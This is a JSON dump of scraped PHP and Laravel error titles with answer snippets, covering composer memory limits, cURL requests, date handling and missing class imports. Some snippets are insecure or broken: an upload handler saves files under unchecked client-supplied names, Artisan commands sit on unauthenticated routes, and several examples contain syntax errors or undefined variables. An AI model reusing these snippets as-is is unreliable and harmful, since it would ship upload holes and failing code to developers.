    "description": "export COMPOSER_MEMORY_LIMIT=-1\nphp -d memory_limit=-1 composer.phar require hwi/oauth-bundle php-http/guzzle6-adapter php-http/httplug-bundle \nOn Windows 10;  Goto C:\\ProgramData\\ComposerSetup\\bin  Edit: composer.bat and add memory_limit=-1 in the last line as shown below.  @echo OFF :: in case DelayedExpansion is on and a path contains !  setlocal DISABLEDELAYEDEXPANSION php -d memory_limit=-1 \"%~dp0composer.phar\" %*\n",
    "reg_date": "2021-10-12T10:12:06.000Z"
  },
  {
    "id": 54,
    "keyword": null,
    "link": null,
    "title": " App\\\\Http\\\\Controllers\\\\DB' not found",
    "description": "use Illuminate\\Support\\Facades\\DB\n",
    "reg_date": "2021-10-12T10:12:07.000Z"
  },
  {
    "id": 55,
    "keyword": null,
    "link": null,
    "title": " App\\Http\\Controllers\\Validator not found",
    "description": "use Illuminate\\Support\\Facades\\Validator;  # most likely you will need these 2 too use Illuminate\\Support\\Facades\\Hash; use App\\User;\n",
    "reg_date": "2021-10-12T10:12:07.000Z"
  },
  {
    "id": 56,
    "keyword": null,
    "link": null,
    "title": " Array and string offset access syntax with curly braces is deprecated",
    "description": "Let's say you have something like this in your code:  $str = \"test\"; echo($str{0});  since PHP 7.4 curly braces method to get individual characters inside a string has been deprecated, so change the above syntax into this:  $str = \"test\"; echo($str[0]);\n",
    "reg_date": "2021-10-12T10:12:07.000Z"
  },
  {
    "id": 57,
    "keyword": null,
    "link": null,
    "title": " Array to String Conversion in PHP",
    "description": "Using implode() function in Php ----------------------- Syntax implode(separator,array);    Example <?php   //assigning value to the array   $dummyArr = array(\"Hello\",\"Greppers,\",\"Ankur\",\"here !\");      echo implode(\" \",$dummyArr);// Use of implode function   ?>      Output: Hello Greppers, Ankur here !\n$gadget = array( 'computer', 'mobile', 'tablet' ); echo implode($arr);\nphpCopy<?php    $array = [\"Lili\", \"Rose\", \"Jasmine\", \"Daisy\"];    $JsonObject = serialize($array);    echo \"The array is converted to the Json string.\";    echo \"\\n\";     echo\"The Json string is $JsonObject\"; ?> \n$person = [     'name' => 'Jon',     'age' => 26,     'status' => null,     'friends' => ['Matt', 'Kaci', 'Jess'] ];  echo json_encode($person); // {\"name\":\"Jon\",\"age\":26,\"status\":null,\"friends\":[\"Matt\",\"Kaci\",\"Jess\"]} \n// Use json_encode to collapse the array to json string: $stuff = array(1,2,3); print json_encode($stuff);   //Prints [1,2,3]\nfunction subArraysToString($ar, $sep = ', ') {     $str = '';     foreach ($ar as $val) {         $str .= implode($sep, $val);         $str .= $sep; // add separator between sub-arrays     }     $str = rtrim($str, $sep); // remove last separator     return $str; }  // $food array from example above echo subArraysToString($food); // apple, raspberry, pear, banana, peas, carrots, cabbage, wheat, rice, oats \n",
    "reg_date": "2021-10-12T10:12:07.000Z"
  },
  {
    "id": 58,
    "keyword": null,
    "link": null,
    "title": " Artisan::call for all catch clear in laravel",
    "description": "//Clear Cache facade value: Route::get('/clear-cache', function() {     $exitCode = Artisan::call('cache:clear');     return '<h1>Cache facade value cleared</h1>'; });  //Reoptimized class loader: Route::get('/optimize', function() {     $exitCode = Artisan::call('optimize');     return '<h1>Reoptimized class loader</h1>'; });  //Route cache: Route::get('/route-cache', function() {     $exitCode = Artisan::call('route:cache');     return '<h1>Routes cached</h1>'; });  //Clear Route cache: Route::get('/route-clear', function() {     $exitCode = Artisan::call('route:clear');     return '<h1>Route cache cleared</h1>'; });  //Clear View cache: Route::get('/view-clear', function() {     $exitCode = Artisan::call('view:clear');     return '<h1>View cache cleared</h1>'; });  //Clear Config cache: Route::get('/config-cache', function() {     $exitCode = Artisan::call('config:cache');     return '<h1>Clear Config cleared</h1>'; }); \n",
    "reg_date": "2021-10-12T10:12:07.000Z"
  },
  {
    "id": 59,
    "keyword": null,
    "link": null,
    "title": " Associative  array in php",
    "description": "<?php  /*  There are 3 Types of array in php   1. Indexed arrays - Arrays with a numeric index 2. Associative arrays - Arrays with named keys 3. Multidimensional arrays - Arrays containing one or more arrays  This is the second one - Associative arrays */  $age = array(\"Samy\"=>\"35\", \"Naveen\"=>\"37\", \"Amit\"=>\"43\"); echo \"Mr.Samy is \" . $age['Samy'] . \" years old.\";  ?>\n<?php \t$associativeArray = [         \"carOne\" => \"BMW\",         \"carTwo\" => \"VW\",         \"carThree\" => \"Mercedes\"     ];          echo $associativeArray[\"carTwo\"] . \" Is a german brand\"; ?>\n",
    "reg_date": "2021-10-12T10:12:07.000Z"
  },
  {
    "id": 60,
    "keyword": null,
    "link": null,
    "title": " Auth::routes(['register' => false]); not working",
    "description": "Auth::routes(['register' => false]);\n",
    "reg_date": "2021-10-12T10:12:07.000Z"
  },
  {
    "id": 61,
    "keyword": null,
    "link": null,
    "title": " Auth log out laravel",
    "description": "Auth::logout();\npublic function manualLogin(){     $user = User::find(1);     Auth::login($user);     return redirect('/'); }   or          Auth::logout();      \n",
    "reg_date": "2021-10-12T10:12:07.000Z"
  },
  {
    "id": 62,
    "keyword": null,
    "link": null,
    "title": " Best debugging tools for php",
    "description": "Xdebug, PHP DebugBar , MacGDBp, Kint, Whoops, Krumo, Pinba, Gubed PHP Debugger, DBG, and PHP_Dyn are some best debugging tools for php.\n",
    "reg_date": "2021-10-12T10:12:07.000Z"
  },
  {
    "id": 63,
    "keyword": null,
    "link": null,
    "title": " Boolean value switch/invert",
    "description": "$boolean = !$boolean; \n",
    "reg_date": "2021-10-12T10:12:08.000Z"
  },
  {
    "id": 64,
    "keyword": null,
    "link": null,
    "title": " C# http post request with file",
    "description": "string fileLocation = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + Path.DirectorySeparatorChar + \"somefile.jpg\"; NameValueCollection values = new NameValueCollection(); NameValueCollection files = new NameValueCollection(); values.Add(\"firstName\", \"Alan\"); files.Add(\"profilePicture\", fileLocation); sendHttpRequest(\"http://example.com/handler.php\", values, files); \n// Example to how you could handle it in PHP echo $_POST['firstName']; $name = $_POST['firstName']; $image = $_FILES['profilePicture']; $ds = DIRECTORY_SEPARATOR; move_uploaded_file($image['tmp_name'], realpath(dirname(__FILE__)) . $ds . \"uploads\" . $ds . $image['name']); \nprivate static string sendHttpRequest(string url, NameValueCollection values, NameValueCollection files = null) {     string boundary = \"----------------------------\" + DateTime.Now.Ticks.ToString(\"x\");     // The first boundary     byte[] boundaryBytes = System.Text.Encoding.UTF8.GetBytes(\"\\r\\n--\" + boundary + \"\\r\\n\");     // The last boundary     byte[] trailer = System.Text.Encoding.UTF8.GetBytes(\"\\r\\n--\" + boundary + \"--\\r\\n\");     // The first time it itereates, we need to make sure it doesn't put too many new paragraphs down or it completely messes up poor webbrick     byte[] boundaryBytesF = System.Text.Encoding.ASCII.GetBytes(\"--\" + boundary + \"\\r\\n\");      // Create the request and set parameters     HttpWebRequest request = (HttpWebRequest) WebRequest.Create(url);     request.ContentType = \"multipart/form-data; boundary=\" + boundary;     request.Method = \"POST\";     request.KeepAlive = true;     request.Credentials = System.Net.CredentialCache.DefaultCredentials;      // Get request stream     Stream requestStream = request.GetRequestStream();      foreach (string key in values.Keys)     {         // Write item to stream         byte[] formItemBytes = System.Text.Encoding.UTF8.GetBytes(string.Format(\"Content-Disposition: form-data; name=\\\"{0}\\\";\\r\\n\\r\\n{1}\", key, values[key]));         requestStream.Write(boundaryBytes, 0, boundaryBytes.Length);         requestStream.Write(formItemBytes, 0, formItemBytes.Length);     }      if (files != null)     {          foreach(string key in files.Keys)         {             if(File.Exists(files[key]))             {                 int bytesRead = 0;                 byte[] buffer = new byte[2048];                 byte[] formItemBytes = System.Text.Encoding.UTF8.GetBytes(string.Format(\"Content-Disposition: form-data; name=\\\"{0}\\\"; filename=\\\"{1}\\\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n\", key, files[key]));                 requestStream.Write(boundaryBytes, 0, boundaryBytes.Length);                 requestStream.Write(formItemBytes, 0, formItemBytes.Length);                  using (FileStream fileStream = new FileStream(files[key], FileMode.Open, FileAccess.Read))                 {                     while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)                     {                         // Write file content to stream, byte by byte                         requestStream.Write(buffer, 0, bytesRead);                     }                      fileStream.Close();                 }             }         }     }      // Write trailer and close stream     requestStream.Write(trailer, 0, trailer.Length);     requestStream.Close();      using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))     {         return reader.ReadToEnd();     }; } \n",
    "reg_date": "2021-10-12T10:12:08.000Z"
  },
  {
    "id": 65,
    "keyword": null,
    "link": null,
    "title": " CURL : Get elements by class name",
    "description": "function getUrl($url){     $ch = curl_init($url);     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     $response = curl_exec($ch);     curl_close($ch);     return $response; }   \n",
    "reg_date": "2021-10-12T10:12:08.000Z"
  },
  {
    "id": 66,
    "keyword": null,
    "link": null,
    "title": " CURL PHP POST",
    "description": "$post = [    'teste' => $_POST['teste'] ]; httpPost('url.com', $post); // function function httpPost($url, $data) {    \t$curl = curl_init($url);     curl_setopt($curl, CURLOPT_POST, true);     curl_setopt($curl, CURLOPT_POSTFIELDS, $data);     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);     $response = curl_exec($curl);     curl_close($curl);     return $response; }\n// set post fields $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ];  $ch = curl_init('http://www.example.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $post);  // execute! $response = curl_exec($ch);  // close the connection, release resources used curl_close($ch);  // do anything you want with your response var_dump($response);\n<?php  $post = [     'username' => 'user1',     'password' => 'passuser1',     'gender'   => 1, ]; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'http://www.domain.com'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); $response = curl_exec($ch); var_export($response); \nPHP cURL GET Request A GET request retrieves data from a server. This can be a website&rsquo;s HTML, an API response or other resources.  <?php  $cURLConnection = curl_init();  curl_setopt($cURLConnection, CURLOPT_URL, 'https://hostname.tld/phone-list'); curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);  $phoneList = curl_exec($cURLConnection); curl_close($cURLConnection);  $jsonArrayResponse - json_decode($phoneList);\nfunction getUrl($url){     $ch = curl_init($url);     curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);     $response = curl_exec($ch);     curl_close($ch);     return $response; }   \n// Get cURL resource $curl = curl_init(); // Set some options - we are passing in a useragent too here curl_setopt_array($curl, [     CURLOPT_RETURNTRANSFER => 1,     CURLOPT_URL => 'http://testcURL.com',     CURLOPT_USERAGENT => 'Codular Sample cURL Request',     CURLOPT_POST => 1,     CURLOPT_POSTFIELDS => [         item1 => 'value',         item2 => 'value2'     ] ]); // Send the request & save response to $resp $resp = curl_exec($curl); // Close request to clear up some resources curl_close($curl); \n",
    "reg_date": "2021-10-12T10:12:08.000Z"
  },
  {
    "id": 67,
    "keyword": null,
    "link": null,
    "title": " Calculate the Difference Between Two Dates Using PHP",
    "description": "//get Date diff as intervals  $d1 = new DateTime(\"2018-01-10 00:00:00\"); $d2 = new DateTime(\"2019-05-18 01:23:45\"); $interval = $d1->diff($d2); $diffInSeconds = $interval->s; //45 $diffInMinutes = $interval->i; //23 $diffInHours   = $interval->h; //8 $diffInDays    = $interval->d; //21 $diffInMonths  = $interval->m; //4 $diffInYears   = $interval->y; //1  //or get Date difference as total difference $d1 = strtotime(\"2018-01-10 00:00:00\"); $d2 = strtotime(\"2019-05-18 01:23:45\"); $totalSecondsDiff = abs($d1-$d2); //42600225 $totalMinutesDiff = $totalSecondsDiff/60; //710003.75 $totalHoursDiff   = $totalSecondsDiff/60/60;//11833.39 $totalDaysDiff    = $totalSecondsDiff/60/60/24; //493.05 $totalMonthsDiff  = $totalSecondsDiff/60/60/24/30; //16.43 $totalYearsDiff   = $totalSecondsDiff/60/60/24/365; //1.35\n<?php function dateDifference($start_date, $end_date) {     // calulating the difference in timestamps      $diff = strtotime($start_date) - strtotime($end_date);           // 1 day = 24 hours      // 24 * 60 * 60 = 86400 seconds     return ceil(abs($diff / 86400)); }   // start date  $start_date = \"2016-01-02\";   // end date  $end_date = \"2016-01-21\";   // call dateDifference() function to find the number of days between two dates $dateDiff = dateDifference($start_date, $end_date);   echo \"Difference between two dates: \" . $dateDiff . \" Days \"; ?> \n$period = new DatePeriod(      new DateTime('2010-10-01'),      new DateInterval('P1D'),      new DateTime('2010-10-05') );  //Which should get you an array with DateTime objects.   //To iterate  foreach ($period as $key => $value) {     //$value->format('Y-m-d')        }\n$timeFirst  = strtotime('2011-05-12 18:20:20'); $timeSecond = strtotime('2011-05-13 18:20:20'); $differenceInSeconds = $timeSecond - $timeFirst; \n$firstDate = \"2019-01-01\"; $secondDate = \"2020-03-04\";  $dateDifference = abs(strtotime($secondDate) - strtotime($firstDate));  $years  = floor($dateDifference / (365 * 60 * 60 * 24)); $months = floor(($dateDifference - $years * 365 * 60 * 60 * 24) / (30 * 60 * 60 * 24)); $days   = floor(($dateDifference - $years * 365 * 60 * 60 * 24 - $months * 30 * 60 * 60 *24) / (60 * 60 * 24));  echo $years.\" year,  \".$months.\" months and \".$days.\" days\";  //output: 1 year, 2 months and 3 days\nphpCopy$firstDate = \"2019-01-01\"; $secondDate = \"2020-03-04\";  $dateDifference = abs(strtotime($secondDate) - strtotime($firstDate));  $years  = floor($dateDifference / (365 * 60 * 60 * 24)); $months = floor(($dateDifference - $years * 365 * 60 * 60 * 24) / (30 * 60 * 60 * 24)); $days   = floor(($dateDifference - $years * 365 * 60 * 60 * 24 - $months * 30 * 60 * 60 *24) / (60 * 60 * 24));  echo $years.\" year,  \".$months.\" months and \".$days.\" days\";  //output: 1 year, 2 months and 3 days \n",
    "reg_date": "2021-10-12T10:12:08.000Z"
  },
  {
    "id": 68,
    "keyword": null,
    "link": null,
    "title": " Call to undefined function App\\Http\\Controllers\\curl init()",
    "description": "sudo apt-get install php5-curl \n",
    "reg_date": "2021-10-12T10:12:08.000Z"
  },
  {
    "id": 69,
    "keyword": null,
    "link": null,
    "title": " Call to undefined function App\\Models\\str slug()",
    "description": "composer require laravel/helpers \n",
    "reg_date": "2021-10-12T10:12:08.000Z"
  },
  {
    "id": 70,
    "keyword": null,
    "link": null,
    "title": " Call to undefined function str limit()  laaravel8",
    "description": "work  {{\\Illuminate\\Support\\Str::limit($product, 500)}} \n",
    "reg_date": "2021-10-12T10:12:08.000Z"
  },
  {
    "id": 71,
    "keyword": null,
    "link": null,
    "title": " Call to undefined method Illuminate\\Session\\Store::set()",
    "description": "Replacing   \\Session::set('u2f.registerData', $req);  WIth  session(['u2f.registerData' => $req]);  Works\n",
    "reg_date": "2021-10-12T10:12:09.000Z"
  },
  {
    "id": 72,
    "keyword": null,
    "link": null,
    "title": " Capitalize in php",
    "description": "//string to all uppercase $string = \"String with Mixed use of Uppercase and Lowercase\"; //php string to uppercase $string = strtoupper($string); // = \"STRING WITH MIXED USE OF UPPERCASE AND LOWERCASE\"\n <?php $foo = 'hello world!'; $foo = ucfirst($foo);             // Hello world!  $bar = 'HELLO WORLD!'; $bar = ucfirst($bar);             // HELLO WORLD! $bar = ucfirst(strtolower($bar)); // Hello world! ?> // string manipulation function  \n<?php /* Convert the first character of \"hello\" to uppercase:  */ echo ucfirst(\"hello samy!\");  //output : Hello samy! ?>\n$lowercase = \"this is lower case\"; $uppercase = strtoupper($lowercase);  echo $uppercase;\n<?php echo strtoupper(\"Hello WORLD!\"); ?>\n <?php $foo = 'bonjour tout le monde!'; $foo = ucfirst($foo);             // Bonjour tout le monde!  $bar = 'BONJOUR TOUT LE MONDE!'; $bar = ucfirst($bar);             // BONJOUR TOUT LE MONDE! $bar = ucfirst(strtolower($bar)); // Bonjour tout le monde! ?>  \n",
    "reg_date": "2021-10-12T10:12:09.000Z"
  },
  {
    "id": 73,
    "keyword": null,
    "link": null,
    "title": " Carbon::today()->toDateString()",
    "description": "$dt = Carbon::create(1975, 12, 25, 14, 15, 16);  var_dump($dt->toDateTimeString() == $dt);          // bool(true) => uses __toString() echo $dt->toDateString();                          // 1975-12-25 echo $dt->toFormattedDateString();                 // Dec 25, 1975 echo $dt->toTimeString();                          // 14:15:16 echo $dt->toDateTimeString();                      // 1975-12-25 14:15:16 echo $dt->toDayDateTimeString();                   // Thu, Dec 25, 1975 2:15 PM  // ... of course format() is still available echo $dt->format('l jS \\\\of F Y h:i:s A');         // Thursday 25th of December 1975 02:15:16 PM  // The reverse hasFormat method allows you to test if a string looks like a given format var_dump(Carbon::hasFormat('Thursday 25th December 1975 02:15:16 PM', 'l jS F Y h:i:s A')); // bool(true) \n",
    "reg_date": "2021-10-12T10:12:09.000Z"
  },
  {
    "id": 74,
    "keyword": null,
    "link": null,
    "title": " Carbon Formatting Carbon Format",
    "description": "$dt = Carbon::create(1975, 12, 25, 14, 15, 16);  var_dump($dt->toDateTimeString() == $dt);          // bool(true) => uses __toString() echo $dt->toDateString();                          // 1975-12-25 echo $dt->toFormattedDateString();                 // Dec 25, 1975 echo $dt->toTimeString();                          // 14:15:16 echo $dt->toDateTimeString();                      // 1975-12-25 14:15:16 echo $dt->toDayDateTimeString();                   // Thu, Dec 25, 1975 2:15 PM  // ... of course format() is still available echo $dt->format('l jS \\\\of F Y h:i:s A');         // Thursday 25th of December 1975 02:15:16 PM  // The reverse hasFormat method allows you to test if a string looks like a given format var_dump(Carbon::hasFormat('Thursday 25th December 1975 02:15:16 PM', 'l jS F Y h:i:s A')); // bool(true) \n",
    "reg_date": "2021-10-12T10:12:09.000Z"
  },
  {
    "id": 75,
    "keyword": null,
    "link": null,
    "title": " Carbon difference between two dates",
    "description": "$dt      = Carbon::create(2012, 1, 31, 0); $future  = Carbon::create(2012, 1, 31, 0);  $future  = $future->addMonth();  echo $dt->diffInDays($future); //31\n$date1->toDateString() == $date2->toDateString()\n",
    "reg_date": "2021-10-12T10:12:09.000Z"
  },
  {
    "id": 76,
    "keyword": null,
    "link": null,
    "title": " Check if a String Contains a Substring in PHP",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; }\nphpCopy<?php $mystring = \"This is a PHP program.\";  if (strpos($mystring, \"program.\") !== false) {     echo(\"True\"); } ?> \nphpCopy<?php $mystring = \"This is a php program.\"; $search = \"a\"; if(preg_match(\"/{$search}/i\", $mystring)) {     echo \"True\"; } else {     echo(\"False\"); } ?> \nphpCopy<?php $mystring = \"This is a PHP program.\";  if (strpos($mystring, \"PHP\", 13) !== false) {     echo(\"True\"); } else {     echo(\"False\"); } ?> \n",
    "reg_date": "2021-10-12T10:12:09.000Z"
  },
  {
    "id": 77,
    "keyword": null,
    "link": null,
    "title": " Class \"App\\Http\\Controllers\\Auth\" not found",
    "description": "use Illuminate\\Support\\Facades\\Auth; \nuse Illuminate\\Routing\\Route; \nBecause your controller is namespaced unless you specifically import the Auth namespace, PHP will assume it's under the namespace of the class, giving this error.  To fix this, add use Auth; at the top of AdminHomeController file along with your other use statements or alternatively prefix all instances of Auth with backslash like this: \\Auth to let PHP know to load it from the global namespace.\n",
    "reg_date": "2021-10-12T10:12:09.000Z"
  },
  {
    "id": 78,
    "keyword": null,
    "link": null,
    "title": " Class 'App\\Http\\Controllers\\Admin\\Route' not found",
    "description": "use Illuminate\\Support\\Facades\\Auth; \nuse Illuminate\\Routing\\Route; \nBecause your controller is namespaced unless you specifically import the Auth namespace, PHP will assume it's under the namespace of the class, giving this error.  To fix this, add use Auth; at the top of AdminHomeController file along with your other use statements or alternatively prefix all instances of Auth with backslash like this: \\Auth to let PHP know to load it from the global namespace.\n",
    "reg_date": "2021-10-12T10:12:09.000Z"
  },
  {
    "id": 79,
    "keyword": null,
    "link": null,
    "title": " Class 'App\\Http\\Controllers\\File' not found",
    "description": "// in laravel append the following at the top of controller use File;\n",
    "reg_date": "2021-10-12T10:12:09.000Z"
  },
  {
    "id": 80,
    "keyword": null,
    "link": null,
    "title": " Class 'App\\Http\\Controllers\\Session' not found",
    "description": "use Session; \n// in laravel append the following at the top of controller use File;\n",
    "reg_date": "2021-10-12T10:12:09.000Z"
  },
  {
    "id": 81,
    "keyword": null,
    "link": null,
    "title": " Class 'App\\Http\\Controllers\\Validator' not found",
    "description": "use Illuminate\\Support\\Facades\\Validator;\nuse Illuminate\\Support\\Facades\\Validator;  # most likely you will need these 2 too use Illuminate\\Support\\Facades\\Hash; use App\\User;\nuse Response; Or use full namespace:  return \\Response::json(...); Or just use helper:  return response()->json(...);\ninclude below line on top of your file use Illuminate\\Support\\Facades\\Validator;\npublic function store()     {         $rules = array(             'name'    => 'required',         );          $validator = Validator::make(Input::all(), $rules);          // if the validator fails, redirect back to the form         if ($validator->fails()) {             return Redirect::back()                 ->withErrors($validator) // send back all errors to the login form                 ->withInput();              $input = input::all();          } else {              $company                = New Company();             $company->name          = Input::get('name');             $company->user_id       = Input::get('user_id');             $company->country_id    = Input::get('country_id');             $company->description   = Input::get('description');              $company->save();              return Redirect::to('/backend')->withInput()->with('success', Company added.');          }     } \n",
    "reg_date": "2021-10-12T10:12:10.000Z"
  },
  {
    "id": 82,
    "keyword": null,
    "link": null,
    "title": " Class 'App\\Http\\Controllers\\View' not found",
    "description": "use Illuminate\\Support\\Facades\\View;  return \\View::make('tickets.bus.index'); \nuse Response; Or use full namespace:  return \\Response::json(...); Or just use helper:  return response()->json(...);\n",
    "reg_date": "2021-10-12T10:12:10.000Z"
  },
  {
    "id": 83,
    "keyword": null,
    "link": null,
    "title": " Class 'Intervention\\Image\\ImageServiceProvider' not found",
    "description": "composer require intervention/image \n   Intervention\\Image\\ImageServiceProvider::class, \n    'Image' => Intervention\\Image\\Facades\\Image::class \n",
    "reg_date": "2021-10-12T10:12:10.000Z"
  },
  {
    "id": 84,
    "keyword": null,
    "link": null,
    "title": " Class 'Pusher' not found",
    "description": "'Pusher' => Pusher\\Pusher::class, \n",
    "reg_date": "2021-10-12T10:12:10.000Z"
  },
  {
    "id": 85,
    "keyword": null,
    "link": null,
    "title": " Column not found: 1054 Unknown column 'api token' in 'where clause",
    "description": "'guards' => [     'web' => [         'driver' => 'session',         'provider' => 'users',     ],      'api' => [         'driver' => 'passport',//instead of token          'provider' => 'users',         'hash' => false,     ], ], \n1.So to answer this question, after racking my brain, I decided to clear the application, configuration, and route caches,that did the trick for me.    php artisan cache:clear    2.You can run the above statement in your console when you wish to clear the application cache. What it does is that this statement clears all caches inside storage\\framework\\cache.    php artisan route:cache    3.This clears your route cache. So if you have added a new route or have changed a route controller or action you can use this one to reload the same.    php artisan config:cache\n",
    "reg_date": "2021-10-12T10:12:10.000Z"
  },
  {
    "id": 86,
    "keyword": null,
    "link": null,
    "title": " Column not found: 1054 Unknown column 'updated at'",
    "description": "// turn off both  public $timestamps = false;  // turn off only updated_at const UPDATED_AT = false;\n",
    "reg_date": "2021-10-12T10:12:10.000Z"
  },
  {
    "id": 87,
    "keyword": null,
    "link": null,
    "title": " Command \"make:controller\" is not defined.",
    "description": "composer require flipbox/lumen-generator   // Inside your bootstrap/app.php file, add:   $app->register(Flipbox\\LumenGenerator\\LumenGeneratorServiceProvider::class);\n",
    "reg_date": "2021-10-12T10:12:10.000Z"
  },
  {
    "id": 88,
    "keyword": null,
    "link": null,
    "title": " Composer detected issues in your platform: Your Composer dependencies require a PHP version \">= 7.3.0\".",
    "description": "composer install --ignore-platform-reqs\n#add to composer.json > config \"platform-check\": false,  composer autoload-dump\ncomposer install --ignore-platform-reqs  or   #add to composer.json > config \"platform-check\": false,  composer autoload-dump \nsudo yum search php-THE_EXTENSION  sudo yum install THE_EXTENSION_FROM_LIST\n",
    "reg_date": "2021-10-12T10:12:10.000Z"
  },
  {
    "id": 89,
    "keyword": null,
    "link": null,
    "title": " Composer detected issues in your platform: Your Composer dependencies require a PHP version \">= 7.3.0\". You are running 7.2.34",
    "description": "composer install --ignore-platform-reqs\n#add to composer.json > config \"platform-check\": false,  composer autoload-dump\ncomposer install --ignore-platform-reqs  or   #add to composer.json > config \"platform-check\": false,  composer autoload-dump \n",
    "reg_date": "2021-10-12T10:12:10.000Z"
  },
  {
    "id": 90,
    "keyword": null,
    "link": null,
    "title": " Composer install : Your requirements could not be resolved to an installable set of packages",
    "description": "apt-get install php-gd \n//Install Necessary PHP Extensions apt-get install php7.4-gmp  apt-get install php-curl sudo apt-get install php7.4-zip sudo apt-get install php-mbstring -y sudo apt-get install php-xml -y //Restart Apache Server sudo service apache2 restart\n",
    "reg_date": "2021-10-12T10:12:11.000Z"
  },
  {
    "id": 91,
    "keyword": null,
    "link": null,
    "title": " Convert DateTime to String in PHP",
    "description": " <?php $date = new DateTime('2000-01-01'); echo $date->format('Y-m-d H:i:s'); ?>  \nphpCopy$theDate    = new DateTime('2020-03-08'); echo $stringDate = $theDate->format('Y-m-d H:i:s');  //output: 2020-03-08 00:00:00 \nphpCopy$date = date_create_from_format('d M, Y', '08 Mar, 2020'); echo $newFormat = date_format($date,\"Y/m/d H:i:s\");  //output: 2020/03/08 00:00:00 \nphpCopy$dateFormat = new DateTime(); // this will return current date echo $stringDate = $date->format(DATE_ATOM);  //output: 2020-03-08T12:54:56+01:00 \nphpCopy$date = explode(\"/\",date('d/m/Y/h/i/s') list($day,$month,$year,$hour,$min,$sec) = $date); echo $month.'/'.$day.'/'.$year.' '.$hour.':'.$min.':'.$sec;  //output: 03/08/2020 02:01:06 \nphpCopydefine ('DATE_ATOM', \"Y-m-d\\TH:i:sP\"); define ('DATE_COOKIE', \"l, d-M-y H:i:s T\"); define ('DATE_ISO8601', \"Y-m-d\\TH:i:sO\"); define ('DATE_RFC822', \"D, d M y H:i:s O\"); define ('DATE_RFC850', \"l, d-M-y H:i:s T\"); define ('DATE_RFC1036', \"D, d M y H:i:s O\"); define ('DATE_RFC1123', \"D, d M Y H:i:s O\"); define ('DATE_RFC2822', \"D, d M Y H:i:s O\"); define ('DATE_RFC3339', \"Y-m-d\\TH:i:sP\"); define ('DATE_RSS', \"D, d M Y H:i:s O\"); define ('DATE_W3C', \"Y-m-d\\TH:i:sP\"); \n",
    "reg_date": "2021-10-12T10:12:11.000Z"
  },
  {
    "id": 92,
    "keyword": null,
    "link": null,
    "title": " Convert String to Date and Date-Time in PHP",
    "description": "$time = strtotime('10/16/2003');  $newformat = date('Y-m-d',$time);  echo $newformat; // 2003-10-16 \n$s = '06/10/2011 19:00:02';$date = strtotime($s);echo date('d/M/Y H:i:s', $date); The above one is the one of the example of converting a string to date. echo $s ->format('Y-m-d'); The above one is another method \nphpCopyecho $dateNew = DateTime::createFromFormat('m-d-Y', '03-08-2020')->format('Y/m/d'); //output: 2020/03/08 \nphpCopy$oldDate = strtotime('03/08/2020');  $newDate = date('Y-m-d',$time);  echo $newDate; //output: 2020-03-08 \nphpCopyecho $dateNew = date_create_from_format(\"m-d-Y\", \"03-08-2020\")->format(\"Y-m-d\"); //output: 2020/03/08 \n",
    "reg_date": "2021-10-12T10:12:11.000Z"
  },
  {
    "id": 93,
    "keyword": null,
    "link": null,
    "title": " Convert a String to a Number in PHP",
    "description": "phpCopy<?php   $variable = \"abc\"; $integer = (int)$variable; echo \"The variable has converted to a number and its value is $integer.\";   ?> \nphpCopy<?php   $variable = \"53\"; $integer = intval($variable); echo \"The variable $variable has converted to a number and its value is $integer.\";   echo \"\\n\";  $variable = \"25.3\"; $float = floatval($variable); echo \"The variable $variable has converted to a number and its value is $float.\";   ?> \nphpCopy<?php   $variable = \"2020Time\"; $integer = intval($variable); echo \"The variable $variable has converted to a number and its value is $integer.\";   echo \"\\n\";  $variable = \"Time2020\"; $integer = intval($variable); echo \"The variable $variable has converted to a number and its value is $integer.\";   echo \"\\n\";  $variable = \"25.3Time\"; $float = floatval($variable); echo \"The variable $variable has converted to a number and its value is $float.\";   echo \"\\n\";  $variable = \"Time25.3\"; $float = floatval($variable); echo \"The variable $variable has converted to a number and its value is $float.\";   ?> \nphpCopy<?php   $variable = \"10\"; $integer = (int)$variable; echo \"The variable $variable has converted to a number and its value is $integer.\";   echo \"\\n\";  $variable = \"8.1\"; $float = (float)$variable; echo \"The variable $variable has converted to a number and its value is $float.\";   ?> \nphpCopy<?php   $variable = \"45\"; settype($variable, \"integer\"); echo \"The variable has converted to a number and its value is $variable.\";   ?> \nphpCopy$variableName = (int)$stringName $variableName = (float)$stringName \nphpCopysettype($variableName, \"typeName\"); \nphpCopyintval( $StringName );   \n",
    "reg_date": "2021-10-12T10:12:11.000Z"
  },
  {
    "id": 94,
    "keyword": null,
    "link": null,
    "title": " Cookies are blocked or not supported by your browser. You must enable cookies to use WordPress.",
    "description": "#in wp-config.php  define('COOKIE_DOMAIN', $_SERVER['HTTP_HOST'] );   #https://www.fiverr.com/tamerjarrar\n you&rsquo;ll need to open your website&rsquo;s function.php file.    Then add the following code:   setcookie(TEST_COOKIE, 'WP Cookie check', 0, COOKIEPATH, COOKIE_DOMAIN); if ( SITECOOKIEPATH != COOKIEPATH ) setcookie(TEST_COOKIE, 'WP Cookie check', 0, SITECOOKIEPATH, COOKIE_DOMAIN); and then save/upload your functions.php file.   #https://www.fiverr.com/shadabdeveloper\n",
    "reg_date": "2021-10-12T10:12:11.000Z"
  },
  {
    "id": 95,
    "keyword": null,
    "link": null,
    "title": " Could not open input file: composer.phar",
    "description": "composer install\n$ composer update friendsofsymfony/elastica-bundle \n",
    "reg_date": "2021-10-12T10:12:11.000Z"
  },
  {
    "id": 96,
    "keyword": null,
    "link": null,
    "title": " Create a table with PHP in html",
